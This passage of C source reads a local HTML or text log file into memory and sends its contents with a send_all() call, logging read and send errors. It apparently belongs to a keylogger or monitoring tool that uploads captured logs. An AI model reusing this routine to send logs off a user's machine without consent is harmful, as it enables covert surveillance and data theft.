            free(buffer);
            fclose(html_log);
            return;
        }        
        free(buffer);
        fclose(html_log);
    }
    else if(TXT_LOG)
    {
        if((txt_log = fopen(log_file_txt, "r+b")) == NULL)
            return;
        fseek(txt_log, 0, SEEK_END);
        size = ftell(txt_log);
        rewind(txt_log);
        buffer = malloc(size);
        if(fread(buffer, 1, size, txt_log) != size){
            get_date();
            get_time();
            sprintf(temp, "\n\n >> >> Error at reading %s - %s %s << <<\n\n", log_file_txt, date, time);
            lgs(temp);
            free(buffer);
            fclose(txt_log);
            return;
        }
        if(send_all(buffer, size) < 0){
            get_date();
            get_time();
            sprintf(temp, "\n\n >> >> Error at sending %s - %s %s << <<\n\n", log_file_txt, date, time);
            lgs(temp);
            free(buffer);
            fclose(txt_log);
            return;
        }        
        free(buffer);
        fclose(txt_log); 
    }
}
